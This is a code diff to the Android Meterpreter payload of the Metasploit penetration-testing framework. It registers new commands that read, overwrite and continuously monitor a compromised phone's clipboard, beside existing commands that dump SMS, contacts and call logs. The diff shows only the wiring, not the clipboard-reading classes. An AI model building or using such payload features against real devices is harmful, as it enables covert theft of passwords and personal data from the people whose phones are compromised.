@@ -6,6 +6,14 @@ import android.os.Looper;
 
 import com.metasploit.meterpreter.android.activity_start_android;
 import com.metasploit.meterpreter.android.check_root_android;
+import com.metasploit.meterpreter.android.clipboard_get_data;
+import com.metasploit.meterpreter.android.clipboard_monitor_dump;
+import com.metasploit.meterpreter.android.clipboard_monitor_pause;
+import com.metasploit.meterpreter.android.clipboard_monitor_purge;
+import com.metasploit.meterpreter.android.clipboard_monitor_resume;
+import com.metasploit.meterpreter.android.clipboard_monitor_start;
+import com.metasploit.meterpreter.android.clipboard_monitor_stop;
+import com.metasploit.meterpreter.android.clipboard_set_data;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
 import com.metasploit.meterpreter.android.dump_sms_android;
@@ -59,6 +67,7 @@ public class AndroidMeterpreter extends Meterpreter {
     private static Context context;
 
     private final IntervalCollectionManager intervalCollectionManager;
+    private ClipManager clipManager;
 
     private void findContext() throws Exception {
         Class<?> activityThreadClass;
@@ -95,6 +104,13 @@ public class AndroidMeterpreter extends Meterpreter {
 
     public IntervalCollectionManager getIntervalCollectionManager() {
         return this.intervalCollectionManager;
+    }
+
+    public synchronized ClipManager getClipManager() {
+        if (clipManager == null) {
+            clipManager = ClipManager.create(context);
+        }
+        return clipManager;
     }
 
     public static Context getContext() {
@@ -167,6 +183,14 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("set_audio_mode", set_audio_mode_android.class);
             mgr.registerCommand("sqlite_query", sqlite_query_android.class);
             mgr.registerCommand("set_wallpaper", set_wallpaper_android.class);
+            mgr.registerCommand("extapi_clipboard_get_data", clipboard_get_data.class);
+            mgr.registerCommand("extapi_clipboard_set_data", clipboard_set_data.class);
+            mgr.registerCommand("extapi_clipboard_monitor_dump", clipboard_monitor_dump.class);
+            mgr.registerCommand("extapi_clipboard_monitor_pause", clipboard_monitor_pause.class);
+            mgr.registerCommand("extapi_clipboard_monitor_purge", clipboard_monitor_purge.class);
+            mgr.registerCommand("extapi_clipboard_monitor_resume", clipboard_monitor_resume.class);
+            mgr.registerCommand("extapi_clipboard_monitor_start", clipboard_monitor_start.class);
+            mgr.registerCommand("extapi_clipboard_monitor_stop", clipboard_monitor_stop.class);
         }
         return getCommandManager().getNewCommands();
     }
